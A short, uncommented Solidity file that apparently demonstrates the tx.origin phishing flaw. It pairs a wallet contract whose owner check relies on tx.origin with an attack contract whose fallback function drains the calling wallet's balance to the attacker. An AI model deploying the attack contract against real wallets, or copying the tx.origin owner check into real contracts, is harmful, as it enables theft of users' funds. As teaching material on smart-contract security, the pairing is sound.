
contract TxUserWallet {
    address owner;

    function TxUserWallet() payable public  {
        owner = msg.sender;
    }

    function transferTo(address dest, uint256 amount) payable public {

        require(tx.origin == owner);
        dest.transfer(amount);
    }

    function getBalance() constant returns(uint256){
        return this.balance;
    }

    function getOwner() constant returns(address){
       return owner;
    }
}


interface TxUserWallet {
    function transferTo(address dest, uint amount) public;
}

contract TxAttackWallet {
    address owner;

    function TxAttackWallet() payable public  {
        owner = msg.sender;
    }

    function() payable public {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);
    }

    function getBalance() constant returns(uint256){
        return this.balance;
    }

    function getOwner() constant returns(address){
       return owner;
    }


}
